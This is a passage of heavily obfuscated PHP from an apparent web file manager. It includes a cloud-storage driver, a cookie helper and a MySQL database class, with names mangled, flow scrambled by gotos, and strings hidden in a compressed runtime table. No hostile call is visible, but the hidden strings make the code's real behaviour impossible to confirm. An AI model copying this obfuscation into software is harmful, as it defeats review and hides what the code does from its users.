$CéÀìÂ—ï = trim($CéÀìÂ—ï, $cåª“Î®Î³[8]); $A‘¨Á¼‡ = empty($CéÀìÂ—ï) ? $cåª“Î®Î³[43] : $CéÀìÂ—ï . $cåª“Î®Î³[8]; return $this->client->getBucket($this->bucket, $A‘¨Á¼‡, $Aãğ±ÄÕ°¨, $Fß…¾Õñ, $cß¥šá¤›, !0); } public function has($fæù†²åï, $B‘Âçˆí× = false, $eÁ£–”Å¶œ = true) { goto bë‹éÏï”‡; aîòŠÈ¿™ô: $BĞÙóßÈ®™ = null; $e¾ËğêÊğ¥ = 500; $c´¸İÒ‹Ã = $e¡‡Ş›Õ¾[8]; goto d…³ßĞ¿Ÿ¤; d…³ßĞ¿Ÿ¤: $AÆ‘Ñ…‚Œ = $C²¯ºš« = array(); while (!0) { check_abort(); $aîà²Ö‹­÷ = $this->listObjs($fæù†²åï, $BĞÙóßÈ®™, $e¾ËğêÊğ¥, $c´¸İÒ‹Ã); if (!$aîà²Ö‹­÷) { break; } $BĞÙóßÈ®™ = $aîà²Ö‹­÷[$e¡‡Ş›Õ¾[208]]; $B·ÈŠ¡ğñ³ = $aîà²Ö‹­÷[$e¡‡Ş›Õ¾[204]]; $b–ÛÎêİŞ½ = $aîà²Ö‹­÷[$e¡‡Ş›Õ¾[207]]; if (empty($B·ÈŠ¡ğñ³) && empty($b–ÛÎêİŞ½)) { break; } if ($B‘Âçˆí×) { if (count($B·ÈŠ¡ğñ³)) { $B·ÈŠ¡ğñ³ = array_column($B·ÈŠ¡ğñ³, $e¡‡Ş›Õ¾[38]); $AÆ‘Ñ…‚Œ = array_merge($AÆ‘Ñ…‚Œ, $B·ÈŠ¡ğñ³); } if (count($b–ÛÎêİŞ½)) { $b–ÛÎêİŞ½ = array_column($b–ÛÎêİŞ½, $e¡‡Ş›Õ¾[38]); $C²¯ºš« = array_merge($C²¯ºš«, $b–ÛÎêİŞ½); } if ($BĞÙóßÈ®™ === null) { break; } continue; } if ($eÁ£–”Å¶œ) { if (!empty($B·ÈŠ¡ğñ³)) { if (count($B·ÈŠ¡ğñ³) > 1 || isset($B·ÈŠ¡ğñ³[0][$e¡‡Ş›Õ¾[38]]) && $B·ÈŠ¡ğñ³[0][$e¡‡Ş›Õ¾[38]] != $C¹øªˆù½Ù) { return !0; } } } else { if (!empty($b–ÛÎêİŞ½)) { return !0; } } if ($BĞÙóßÈ®™ === null) { break; } } if ($B‘Âçˆí×) { $AÆ‘Ñ…‚Œ = array_diff($AÆ‘Ñ…‚Œ, array($C¹øªˆù½Ù)); $AÆ‘Ñ…‚Œ = count(array_unique($AÆ‘Ñ…‚Œ)); $C²¯ºš« = count(array_unique($C²¯ºš«)); return array($e¡‡Ş›Õ¾[209] => $AÆ‘Ñ…‚Œ, $e¡‡Ş›Õ¾[210] => $C²¯ºš«); } goto eç÷³ëˆÂê; bë‹éÏï”‡: $e¡‡Ş›Õ¾ =& $_SERVER[±á õÁ]; $fæù†²åï = trim($fæù†²åï, $e¡‡Ş›Õ¾[8]); $C¹øªˆù½Ù = empty($fæù†²åï) ? $e¡‡Ş›Õ¾[43] : $fæù†²åï . $e¡‡Ş›Õ¾[8]; goto aîòŠÈ¿™ô; eç÷³ëˆÂê: return !1; goto dÄªìƒöŒ¸; dÄªìƒöŒ¸: } public function listAll($FÉ†›øè‰æ) { $D–Œ‡ãŠ†ñ =& $_SERVER[±á õÁ]; $eª«œè’ƒ = $this->fileList($FÉ†›øè‰æ, $D–Œ‡ãŠ†ñ[43], !0); $Cšò‘¤«˜ = array(); foreach ($eª«œè’ƒ[$D–Œ‡ãŠ†ñ[83]] as $EñÌŸÚ±Î¢) { $Cšò‘¤«˜[$EñÌŸÚ±Î¢[$D–Œ‡ãŠ†ñ[38]]] = $EñÌŸÚ±Î¢[$D–Œ‡ãŠ†ñ[87]]; } foreach ($eª«œè’ƒ[$D–Œ‡ãŠ†ñ[84]] as $EñÌŸÚ±Î¢) { if (is_string($EñÌŸÚ±Î¢)) { $Cšò‘¤«˜[$EñÌŸÚ±Î¢] = 0; } } return $this->listAllFiles($FÉ†›øè‰æ, array_keys($Cšò‘¤«˜), $Cšò‘¤«˜); } public function canRead($Aâ›¯ŸŒ¤Ä) { $E„íÊ¹ƒĞŠ =& $_SERVER[±á õÁ]; $CÑ®øåä² = $this->client->getAccessControlPolicy($this->bucket, $Aâ›¯ŸŒ¤Ä); if (!$CÑ®øåä²) { return !1; } return in_array($CÑ®øåä², array($E„íÊ¹ƒĞŠ[211], $E„íÊ¹ƒĞŠ[212], $E„íÊ¹ƒĞŠ[213])) ? !0 : !1; } public function canWrite($f©…İÅÔ) { $E«¡œíÚƒÜ =& $_SERVER[±á õÁ]; $B¦¸‚„˜œ = $this->client->getAccessControlPolicy($this->bucket, $f©…İÅÔ); if (!$B¦¸‚„˜œ) { return !1; } return in_array($B¦¸‚„˜œ, array($E«¡œíÚƒÜ[211], $E«¡œíÚƒÜ[212])) ? !0 : !1; } public function getContent($f¬ùÏ†ñÔ„) { return $this->client->getObject($this->bucket, $f¬ùÏ†ñÔ„); } public function setContent($E™Šªßâ, $c§Âê½¤‘’ = '', $BñÈÇ›óâ¤ = false) { goto D‹í¥Œ“Ô¡; D‹í¥Œ“Ô¡: $d„®×Àá¢Ç =& $_SERVER[±á õÁ]; $E™Šªßâ = $BñÈÇ›óâ¤ ? trim($E™Šªßâ, $d„®×Àá¢Ç[8]) . $d„®×Àá¢Ç[8] : $E™Šªßâ; $c·¤×Æ‹ƒ› = get_file_mime(get_path_ext($E™Šªßâ)); goto EŒšä³¹; EŒšä³¹: $FÎ—â‰¡ò¬ = $this->client->putObject($c§Âê½¤‘’, $this->bucket, $E™Šªßâ, $d„®×Àá¢Ç[199], array(), $c·¤×Æ‹ƒ›); if (!$FÎ—â‰¡ò¬) { return !1; } if ($BñÈÇ›óâ¤) { return !0; } goto eáãÛ›Ç¥; eáãÛ›Ç¥: $this->cacheMethod(null, null); $FÎ—â‰¡ò¬ = $this->copyFile($E™Šªßâ, $E™Šªßâ, array($d„®×Àá¢Ç[214] => $FÎ—â‰¡ò¬[$d„®×Àá¢Ç[215]])); return $FÎ—â‰¡ò¬ ? !0 : !1; goto dƒ›À¦Ì‹®; dƒ›À¦Ì‹®: } public function fileSubstr($a¬ß˜––ÒŸ, $FîÃÜ¸‘ËŒ, $aĞƒÄ°Ã) { $FƒÈêğ‚‡Ó = $FîÃÜ¸‘ËŒ + $aĞƒÄ°Ã - 1; return $this->client->getObject($this->bucket, $a¬ß˜––ÒŸ, array($_SERVER[±á õÁ][216] => "\142\171\x74\145\x73\75{$FîÃÜ¸‘ËŒ}\x2d{$FƒÈêğ‚‡Ó}")); } public function upload($FÀ…áŠ¬¤˜, $cƒ£ØÛÖ“…, $d«•Ïƒ˜”¼ = false, $cÂ…ÒÒº = REPEAT_REPLACE) { $dä®µíÂÕ  =& $_SERVER[±á õÁ]; $D…›Ï„ˆ“– = array($dä®µíÂÕ [214] => @md5_file($cƒ£ØÛÖ“…)); $d¸Éğ‹ˆÓ = array($dä®µíÂÕ [217] => get_file_mime(get_path_ext($FÀ…áŠ¬¤˜))); if (IO::size($cƒ£ØÛÖ“…) <= 1024 * 1024 * 200) { $e¢Ó«Šªâ = $this->client->putObjectFile($cƒ£ØÛÖ“…, $this->bucket, $FÀ…áŠ¬¤˜, $dä®µíÂÕ [199], $D…›Ï„ˆ“–, $d¸Éğ‹ˆÓ); return !empty($e¢Ó«Šªâ) ? $this->getPathOuter($FÀ…áŠ¬¤˜) : !1; } $e‹Îã³êöá = $this->client->multiUploadObject($cƒ£ØÛÖ“…, $this->bucket, trim($FÀ…áŠ¬¤˜, $dä®µíÂÕ [8]), $D…›Ï„ˆ“–, $d¸Éğ‹ˆÓ); return $e‹Îã³êöá ? $this->getPathOuter($FÀ…áŠ¬¤˜) : !1; } public function download($E–›Ä«ï©, $eáß‹ËçÎÑ) { if (!@is_dir($this->pathFather($eáß‹ËçÎÑ)) && !IO::mkdir($this->pathFather($eáß‹ËçÎÑ))) { return !1; } $CÕì±à˜¸£ = $this->client->getObject($this->bucket, $E–›Ä«ï©, array(), $eáß‹ËçÎÑ); return $CÕì±à˜¸£ !== !1 ? $eáß‹ËçÎÑ : !1; } public function link($cìÙ•õßØ, $D•âÆ¼»®‘ = array()) { $B¸ŠŞÓ™Óç =& $_SERVER[±á õÁ]; if ($this->signVer == $B¸ŠŞÓ™Óç[218]) { return $this->client->getAuthenticatedURL($this->bucket, $cìÙ•õßØ, 3600 * 12, $D•âÆ¼»®‘); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($cìÙ•õßØ, $B¸ŠŞÓ™Óç[8]), 3600 * 12, $this->region, array(), !0, $D•âÆ¼»®‘); } public function fileOut($Bø´¥ïÁ¤, $F’®ªï = false, $e¬ùµ¨ˆ° = false, $d¡åÑ¹İ‘– = '') { goto C›‘¶éâ‡; féÓÄ‹‰É: $FîÆÀÉŸ… = get_file_mime(get_path_ext($e¬ùµ¨ˆ°)); if ($FîÆÀÉŸ… == $D¾ô‰æƒÑ…[219]) { return parent::fileOut($Bø´¥ïÁ¤, $F’®ªï, $e¬ùµ¨ˆ°, $d¡åÑ¹İ‘–); } $F’®ªï = $F’®ªï ? $D¾ô‰æƒÑ…[220] : $D¾ô‰æƒÑ…[221]; goto AìÍÆÔ¬Ü¼; C›‘¶éâ‡: $D¾ô‰æƒÑ… =& $_SERVER[±á õÁ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Bø´¥ïÁ¤, $F’®ªï, $e¬ùµ¨ˆ°, $d¡åÑ¹İ‘–); } if (!$e¬ùµ¨ˆ°) { $e¬ùµ¨ˆ° = $this->pathThis($Bø´¥ïÁ¤); } goto féÓÄ‹‰É; AìÍÆÔ¬Ü¼: $e®œÎÕ„§Œ = array($D¾ô‰æƒÑ…[222] => $F’®ªï . $D¾ô‰æƒÑ…[223] . rawurlencode($e¬ùµ¨ˆ°), $D¾ô‰æƒÑ…[224] => $FîÆÀÉŸ…); $F¿Ä­³ÑØ‡ = $this->link($Bø´¥ïÁ¤, $e®œÎÕ„§Œ); $this->fileOutLink($F¿Ä­³ÑØ‡); goto Eµ‚‰Š•™Û; Eµ‚‰Š•™Û: } public function fileOutServer($bÍÌ›‰õÑ®, $cİË‚— ¨ = false, $EÔ³ó¸Æ•å = false, $bà¬Ÿ«ßƒœ = '') { parent::fileOut($bÍÌ›‰õÑ®, $cİË‚— ¨, $EÔ³ó¸Æ•å, $bà¬Ÿ«ßƒœ); } public function fileOutImageServer($b ÅİÖØÒá, $eù¤Ò“‹•¹ = 250) { parent::fileOutImage($b ÅİÖØÒá, $eù¤Ò“‹•¹); } public function hashMd5($a·§Ÿëà“Š, $eŠÔîàÄ¡ = '') { $f°—ÉêØ±ß =& $_SERVER[±á õÁ]; $CÉ¼ŒŠîô = $this->objectMeta($a·§Ÿëà“Š); if (!$CÉ¼ŒŠîô) { return !1; } $eŠÔîàÄ¡ = $eŠÔîàÄ¡ ? $eŠÔîàÄ¡ : _get($CÉ¼ŒŠîô, $f°—ÉêØ±ß[225]); $eŠÔîàÄ¡ = $eŠÔîàÄ¡ ? $eŠÔîàÄ¡ : _get($CÉ¼ŒŠîô, $f°—ÉêØ±ß[215], $f°—ÉêØ±ß[43]); return $eŠÔîàÄ¡; } public function uploadFormData($còÖ¢¶¡îÆ, $bîÖ±ÍŸéÉ = 3600) { $Bˆ¿¼†¾´ =& $_SERVER[±á õÁ]; $E—ä‹µ¢‹  = $this->pathFather($còÖ¢¶¡îÆ); $A»ãÈ‘õ£” = $this->client->getHttpUploadPostParams($this->bucket, $E—ä‹µ¢‹ , $Bˆ¿¼†¾´[199], $bîÖ±ÍŸéÉ); return array_merge((array) $A»ãÈ‘õ£”, array($Bˆ¿¼†¾´[183] => $this->getHost())); } public function multiUploadFormData($Eà¥°òáé, $AÂ™…Ê‚à = 3600) { $fš“·„Ğä =& $_SERVER[±á õÁ]; $f‚ì°·”ì¯ = gmdate($fš“·„Ğä[226]); $eÏïâ˜íïë = array(); $Bì¯±”â‚¦ = $this->client->getUploadId($this->bucket, $Eà¥°òáé, $eÏïâ˜íïë); if (!$Bì¯±”â‚¦) { return !1; } return array($fš“·„Ğä[227] => $Bì¯±”â‚¦, $fš“·„Ğä[183] => $this->getHost() . $fš“·„Ğä[8] . $this->pathEncode($Eà¥°òáé), $fš“·„Ğä[228] => $f‚ì°·”ì¯, $fš“·„Ğä[99] => $Eà¥°òáé); } public function multiUploadAuthData($B±ïí¶ë, $c¥¥µÄÏÈ = array()) { goto B‘À¸áÓÁ‡; eË„…Î»»ä: if (strpos($aŒÜØ¹ğ½Ã, $BŞŒõì¹[231]) === 0) { return array($BŞŒõì¹[237] => $d¼¹Ë©òÖ›, $BŞŒõì¹[228] => $b‡ßÛ™Ì‘); } return $d¼¹Ë©òÖ›; goto A¸î˜³à; b Üï„˜àì: $d×­©İ£ÎÀ = array($BŞŒõì¹[230], $BŞŒõì¹[43], $BŞŒõì¹[126], $BŞŒõì¹[43], "\x78\55\x61\155\x7a\55\144\141\x74\145\x3a{$b‡ßÛ™Ì‘}", $BŞŒõì¹[8] . $this->bucket . $BŞŒõì¹[8] . $this->pathEncode($E«éîÚˆä¤) . $aŒÜØ¹ğ½Ã); if (strpos($aŒÜØ¹ğ½Ã, $BŞŒõì¹[231]) === 0) { $d×­©İ£ÎÀ[0] = $BŞŒõì¹[232]; } if (isset($c¥¥µÄÏÈ[$BŞŒõì¹[233]]) && $c¥¥µÄÏÈ[$BŞŒõì¹[233]] == $BŞŒõì¹[234]) { $d×­©İ£ÎÀ[0] = $BŞŒõì¹[234]; } goto cŠŒ™¿”Î; EÍ‡ŒÚ¹—: $E«éîÚˆä¤ = $c¥¥µÄÏÈ[$BŞŒõì¹[99]]; unset($c¥¥µÄÏÈ[$BŞŒõì¹[99]]); if (isset($c¥¥µÄÏÈ[$BŞŒõì¹[229]])) { $c¥¥µÄÏÈ[$BŞŒõì¹[228]] = $b‡ßÛ™Ì‘; return $this->listUploadParts($E«éîÚˆä¤, $c¥¥µÄÏÈ); } goto b Üï„˜àì; B‘À¸áÓÁ‡: $BŞŒõì¹ =& $_SERVER[±á õÁ]; $b‡ßÛ™Ì‘ = isset($c¥¥µÄÏÈ[$BŞŒõì¹[228]]) ? $c¥¥µÄÏÈ[$BŞŒõì¹[228]] : gmdate($BŞŒõì¹[226]); $aŒÜØ¹ğ½Ã = isset($c¥¥µÄÏÈ[$BŞŒõì¹[175]]) ? $c¥¥µÄÏÈ[$BŞŒõì¹[175]] : $BŞŒõì¹[43]; goto EÍ‡ŒÚ¹—; cŠŒ™¿”Î: $b†Â¡Ë·Äø = implode($BŞŒõì¹[14], $d×­©İ£ÎÀ); $däÂåµĞ® = base64_encode(hash_hmac($BŞŒõì¹[235], $b†Â¡Ë·Äø, $this->secret, !0)); $d¼¹Ë©òÖ› = $BŞŒõì¹[236] . $this->accessKey . $BŞŒõì¹[4] . $däÂåµĞ®; goto eË„…Î»»ä; A¸î˜³à: } public function listUploadParts($CŒ®ùÁ–½, $a´šïî‰–‰ = array()) { goto e¬õ›··Ä; eášÃÄÚÜ: $BÕØÙğ–š‰ = $this->multiUploadAuthData($CŒ®ùÁ–½, $a´šïî‰–‰); if (empty($BÕØÙğ–š‰)) { return !1; } return array($E ëçÏ˜È¹[237] => $BÕØÙğ–š‰, $E ëçÏ˜È¹[228] => $a´šïî‰–‰[$E ëçÏ˜È¹[228]], $E ëçÏ˜È¹[239] => $bªŠù²È); goto e¡ßïÏ¾í; e¬õ›··Ä: $E ëçÏ˜È¹ =& $_SERVER[±á õÁ]; $fˆ´Ì¼¸µé = str_replace($E ëçÏ˜È¹[238], $E ëçÏ˜È¹[43], $a´šïî‰–‰[$E ëçÏ˜È¹[175]]); $bªŠù²È = $this->client->listParts($this->bucket, $CŒ®ùÁ–½, $fˆ´Ì¼¸µé); goto dŒÎÖÆì¶; dŒÎÖÆì¶: if (!$bªŠù²È) { return !1; } unset($a´šïî‰–‰[$E ëçÏ˜È¹[229]], $a´šïî‰–‰[$E ëçÏ˜È¹[233]]); $a´šïî‰–‰[$E ëçÏ˜È¹[99]] = $CŒ®ùÁ–½; goto eášÃÄÚÜ; e¡ßïÏ¾í: } public function getHost() { return parent::getHost() . $_SERVER[±á õÁ][8] . $this->bucket; } public function size($d§Âë¾‡ß¥) { $E‡ÃĞß©”Ã = $this->objectMeta($d§Âë¾‡ß¥); return $E‡ÃĞß©”Ã ? $E‡ÃĞß©”Ã[$_SERVER[±á õÁ][87]] : 0; } public function info($dğ¤º³ö†â) { if ($this->isFolder($dğ¤º³ö†â)) { return $this->folderInfo($dğ¤º³ö†â); } else { if ($this->isFile($dğ¤º³ö†â)) { return $this->fileInfo($dğ¤º³ö†â); } } return !1; } public function exist($D›™™·…ğ§) { return $this->isFile($D›™™·…ğ§) || $this->isFolder($D›™™·…ğ§); } public function isFile($FŞ¨Ââº„) { return !$this->isFolder($FŞ¨Ââº„) && $this->objectMeta($FŞ¨Ââº„); } public function isFolder($dÃºšœè“…) { return $this->cacheMethod($_SERVER[±á õÁ][205], $dÃºšœè“…); } protected function objectMeta($cñÉ¾¥‰¼´) { return $this->cacheMethod($_SERVER[±á õÁ][206], $cñÉ¾¥‰¼´); } protected function _objectMeta($bÌ×ÜÃõ†§) { $a“è„äŒ‚Æ =& $_SERVER[±á õÁ]; $bÌ×ÜÃõ†§ = rtrim($bÌ×ÜÃõ†§, $a“è„äŒ‚Æ[8]); try { $b¦ ¥ÇÂ”Ú = $this->client->getObjectInfo($this->bucket, $bÌ×ÜÃõ†§); if (!isset($b¦ ¥ÇÂ”Ú[$a“è„äŒ‚Æ[225]]) && isset($b¦ ¥ÇÂ”Ú[$a“è„äŒ‚Æ[240]])) { $b¦ ¥ÇÂ”Ú[$a“è„äŒ‚Æ[225]] = $b¦ ¥ÇÂ”Ú[$a“è„äŒ‚Æ[240]]; } } catch (Exception $b£ÜË‘Ç•ß) { $b¦ ¥ÇÂ”Ú = !1; } if (!$b¦ ¥ÇÂ”Ú) { } return $b¦ ¥ÇÂ”Ú; } protected function _isFolder($bñö¦éÎ•…) { goto a¿†¤Çäòš; F‡œÉÊÔªÏ: if (substr($FÒÄâµ§Ïì, -1) == $Cø Æµ…öÒ[8]) { return !0; } if (get_path_this($FÒÄâµ§Ïì) == get_path_this($bñö¦éÎ•…)) { return !1; } return !0; goto FôóªÏø¯ß; CÕ†ìáÓáç: $BÂƒ±„† = $this->client->getBucket($this->bucket, $bñö¦éÎ•…, null, 1); if (empty($BÂƒ±„†[$Cø Æµ…öÒ[204]])) { return !1; } $FÒÄâµ§Ïì = $BÂƒ±„†[$Cø Æµ…öÒ[204]][0][$Cø Æµ…öÒ[38]]; goto F‡œÉÊÔªÏ; a¿†¤Çäòš: $Cø Æµ…öÒ =& $_SERVER[±á õÁ]; $bñö¦éÎ•… = rtrim($bñö¦éÎ•…, $Cø Æµ…öÒ[8]); if ($bñö¦éÎ•… == $Cø Æµ…öÒ[43] || $bñö¦éÎ•… == $Cø Æµ…öÒ[8]) { return !0; } goto CÕ†ìáÓáç; FôóªÏø¯ß: } } goto eåøŠÂŸ¡‚; Eäğ¹÷»çæ: define($_SERVER[±á õÁ][0], $_SERVER[±á õÁ][1]); $_SERVER[¢ğ´ ] = explode($_SERVER[±á õÁ][2], gzinflate(substr($_SERVER[±á õÁ][3], 10, -8))); function binCheckEq($EÑÆîİÛ–, $DÌÅ¨‹Óˆ†) { return $EÑÆîİÛ– == $DÌÅ¨‹Óˆ†; } goto d‡Ÿ¹£áœ¹; aïÀÓ³¸²: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($fÂÔÎÙô¥õ = '', $b®ààº¯àò = 0) { if (is_string($fÂÔÎÙô¥õ) && $fÂÔÎÙô¥õ != $_SERVER[±á õÁ][43]) { $this->prefix = $fÂÔÎÙô¥õ; } if (is_numeric($b®ààº¯àò) && $b®ààº¯àò > 0) { $this->expire = $b®ààº¯àò; } } public static function getInstance() { static $EÇ…¹ª«Ó; if ($EÇ…¹ª«Ó === null) { $EÇ…¹ª«Ó = new self(); } return $EÇ…¹ª«Ó; } private static $sameCookieSet = array(); public static function set($Fïó‘´¬, $c¤ñ±›ËÅ¡, $Bã·«¾¶éÑ = 0, $f¦ğ±Ú·‹ô = false, $d¦ÃÄ¾×óˆ = false) { goto C²¿çö À; aî‘ÜƒÌÜó: setcookie($Fïó‘´¬, $c¤ñ±›ËÅ¡, time() + $Bã·«¾¶éÑ, $fˆ©ù…¬ƒ[8] . trim($d¦ÃÄ¾×óˆ, $fˆ©ù…¬ƒ[8]) . $D¼²Ş‰ö´‹, !1, !1, $f¦ğ±Ú·‹ô); goto D»Ù–«‚áÑ; Eô¼‹í»„Ú: self::$sameCookieSet[$Fïó‘´¬] = $c¤ñ±›ËÅ¡ . $Bã·«¾¶éÑ; if (!$d¦ÃÄ¾×óˆ) { $d¦ÃÄ¾×óˆ = str_replace(HOST, $fˆ©ù…¬ƒ[43], APP_HOST); $d¦ÃÄ¾×óˆ = _get($GLOBALS, $fˆ©ù…¬ƒ[817], $d¦ÃÄ¾×óˆ); } $D¼²Ş‰ö´‹ = $fˆ©ù…¬ƒ[43]; goto aî‘ÜƒÌÜó; C²¿çö À: $fˆ©ù…¬ƒ =& $_SERVER[±á õÁ]; if (!$Bã·«¾¶éÑ) { $Bã·«¾¶éÑ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Fïó‘´¬]) && self::$sameCookieSet[$Fïó‘´¬] == $c¤ñ±›ËÅ¡ . $Bã·«¾¶éÑ) { return; } goto Eô¼‹í»„Ú; D»Ù–«‚áÑ: } public static function setSafe($D°ë °‰Í‚, $eËŠº×Ôó, $D„—½ùºäÚ = 0) { self::set($D°ë °‰Í‚, $eËŠº×Ôó, $D„—½ùºäÚ, !0); } public static function get($cæ¢ÓÌ„‹¨) { return isset($_COOKIE[$cæ¢ÓÌ„‹¨]) ? $_COOKIE[$cæ¢ÓÌ„‹¨] : !1; } public static function remove($a»ÆŞÒå„…, $bÕ¶ç¨ç¤â = false) { unset($_COOKIE[$a»ÆŞÒå„…]); self::set($a»ÆŞÒå„…, $_SERVER[±á õÁ][43], 1, $bÕ¶ç¨ç¤â); } } class DbMysql extends Db { public function __construct($bùÜÏÅéë = '') { $c†ŠŸ©§¼Ô =& $_SERVER[±á õÁ]; if (!extension_loaded($c†ŠŸ©§¼Ô[752])) { think_exception(think_lang($c†ŠŸ©§¼Ô[20]) . $c†ŠŸ©§¼Ô[818]); } if (!empty($bùÜÏÅéë)) { $this->config = $bùÜÏÅéë; if (empty($this->config[$c†ŠŸ©§¼Ô[23]])) { $this->config[$c†ŠŸ©§¼Ô[23]] = $c†ŠŸ©§¼Ô[43]; } } } public function connect($bÖà„¿óÑÇ = '', $F´ËĞÆİÛõ = 0, $C‘µÖÙÕö÷ = false) { $B¹øõôÀöç =& $_SERVER[±á õÁ]; if (!isset($this->linkID[$F´ËĞÆİÛõ])) { goto dêÍâ¿Æ÷; C×ßÙÈğÎ¾: if ($cˆÓØ½”Ä‚) { $this->linkID[$F´ËĞÆİÛõ] = mysql_pconnect($EîòÃ‹ñÂ, $bÖà„¿óÑÇ[$B¹øõôÀöç[821]], $bÖà„¿óÑÇ[$B¹øõôÀöç[822]], 131072); } else { $this->linkID[$F´ËĞÆİÛõ] = mysql_connect($EîòÃ‹ñÂ, $bÖà„¿óÑÇ[$B¹øõôÀöç[821]], $bÖà„¿óÑÇ[$B¹øõôÀöç[822]], !0, 131072); } if (!$this->linkID[$F´ËĞÆİÛõ] || !empty($bÖà„¿óÑÇ[$B¹øõôÀöç[27]]) && !mysql_select_db($bÖà„¿óÑÇ[$B¹øõôÀöç[27]], $this->linkID[$F´ËĞÆİÛõ])) { think_exception(mysql_error()); } $Bš”ª›¨Àò = mysql_get_server_info($this->linkID[$F´ËĞÆİÛõ]); goto F–¡‚½Ù³’; F–¡‚½Ù³’: mysql_query($B¹øõôÀöç[823] . think_config($B¹øõôÀöç[824]) . $B¹øõôÀöç[65], $this->linkID[$F´ËĞÆİÛõ]); if ($Bš”ª›¨Àò > $B¹øõôÀöç[825]) { mysql_query($B¹øõôÀöç[826], $this->linkID[$F´ËĞÆİÛõ]); } $this->connected = !0; goto EÕ¶İ¥»»; EÕ¶İ¥»»: if (1 != think_config($B¹øõôÀöç[28])) { unset($this->config); } goto eÈ±–ŞÑç; dêÍâ¿Æ÷: if (empty($bÖà„¿óÑÇ)) { $bÖà„¿óÑÇ = $this->config; } $EîòÃ‹ñÂ = $bÖà„¿óÑÇ[$B¹øõôÀöç[819]] . ($bÖà„¿óÑÇ[$B¹øõôÀöç[820]] ? "\72{$bÖà„¿óÑÇ[$B¹øõôÀöç[820]]}" : $B¹øõôÀöç[43]); $cˆÓØ½”Ä‚ = !empty($bÖà„¿óÑÇ[$B¹øõôÀöç[23]][$B¹øõôÀöç[24]]) ? $bÖà„¿óÑÇ[$B¹øõôÀöç[23]][$B¹øõôÀöç[24]] : $this->pconnect; goto C×ßÙÈğÎ¾; eÈ±–ŞÑç: } return $this->linkID[$F´ËĞÆİÛõ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aÍì¥«¤ê) { goto cÖ‰ ‰åØ¯; fÌ½ö­«´: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto DöøĞ˜µÚò; AğÉ³Œ–ß¯: think_action_status($A”óÆØ¥ó•[29], 1); think_status($A”óÆØ¥ó•[30]); $this->queryID = mysql_query($aÍì¥«¤ê, $this->_linkID); goto fÌ½ö­«´; d«­’ºé‰°: if (!$this->_linkID) { return !1; } $this->queryStr = $aÍì¥«¤ê; if ($this->queryID) { $this->free(); } goto AğÉ³Œ–ß¯; cÖ‰ ‰åØ¯: $A”óÆØ¥ó• =& $_SERVER[±á õÁ]; if (0 === stripos($aÍì¥«¤ê, $A”óÆØ¥ó•[267])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto d«­’ºé‰°; DöøĞ˜µÚò: } public function execute($b·ŒøğÛñâ) { goto AºÇÙŒœğ; f¨‰Ñ¼§îù: if (!1 === $BŒö§Öõ–) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto FÕ‡ğçÙó½; a¦äº¡ÊˆÎ: $this->queryStr = $b·ŒøğÛñâ; if ($this->queryID) { $this->free(); } think_action_status($DÍÉ¸½£õÏ[31], 1); goto cÀóš‚±ìß; cÀóš‚±ìß: think_status($DÍÉ¸½£õÏ[30]); $BŒö§Öõ– = mysql_query($b·ŒøğÛñâ, $this->_linkID); $this->debug(); goto f¨‰Ñ¼§îù; AºÇÙŒœğ: $DÍÉ¸½£õÏ =& $_SERVER[±á õÁ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a¦äº¡ÊˆÎ; FÕ‡ğçÙó½: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[±á õÁ][827], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C©ªæçÓ = mysql_query($_SERVER[±á õÁ][828], $this->_linkID); $this->transTimes = 0; if (!$C©ªæçÓ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $aæŒÑ™ã = mysql_query($_SERVER[±á õÁ][829], $this->_linkID); $this->transTimes = 0; if (!$aæŒÑ™ã) { $this->error(); return !1; } } return !0; } private function getAll() { $dè˜æ÷Ã¼„ = array(); if ($this->numRows > 0) { while ($DÆ¸ø‹Ğª† = mysql_fetch_assoc($this->queryID)) { $dè˜æ÷Ã¼„[] = $DÆ¸ø‹Ğª†; } mysql_data_seek($this->queryID, 0); } return $dè˜æ÷Ã¼„; } public function getFields($c„Ü…™¾ç) { $e¼¹òÛ×™Ÿ =& $_SERVER[±á õÁ]; $c”È—³‘ñ = $this->query($e¼¹òÛ×™Ÿ[830] . $this->parseKey($c„Ü…™¾ç)); $bİîÏ¯Ï•ö = array(); if ($c”È—³‘ñ) { foreach ($c”È—³‘ñ as $c®Í£¥àò’ => $E…„”¹å) { $bİîÏ¯Ï•ö[$E…„”¹å[$e¼¹òÛ×™Ÿ[37]]] = array($e¼¹òÛ×™Ÿ[38] => $E…„”¹å[$e¼¹òÛ×™Ÿ[37]], $e¼¹òÛ×™Ÿ[39] => $E…„”¹å[$e¼¹òÛ×™Ÿ[40]], $e¼¹òÛ×™Ÿ[41] => (bool) (strtoupper($E…„”¹å[$e¼¹òÛ×™Ÿ[42]]) === $e¼¹òÛ×™Ÿ[831]), $e¼¹òÛ×™Ÿ[44] => $E…„”¹å[$e¼¹òÛ×™Ÿ[45]], $e¼¹òÛ×™Ÿ[46] => strtolower($E…„”¹å[$e¼¹òÛ×™Ÿ[47]]) == $e¼¹òÛ×™Ÿ[48], $e¼¹òÛ×™Ÿ[49] => strtolower($E…„”¹å[$e¼¹òÛ×™Ÿ[50]]) == $e¼¹òÛ×™Ÿ[51]); } } return $bİîÏ¯Ï•ö; } public function getTables($dùõÑÚ¹® = '') { $CìÏå•¸óğ =& $_SERVER[±á õÁ]; if (!empty($dùõÑÚ¹®)) { $fÉ™óÍÄ²¸ = $CìÏå•¸óğ[832] . $dùõÑÚ¹® . $CìÏå•¸óğ[833]; } else { $fÉ™óÍÄ²¸ = $CìÏå•¸óğ[834]; } $E‘—²ò = $this->query($fÉ™óÍÄ²¸); $Dİ‹“†¶…ã = array(); foreach ($E‘—²ò as 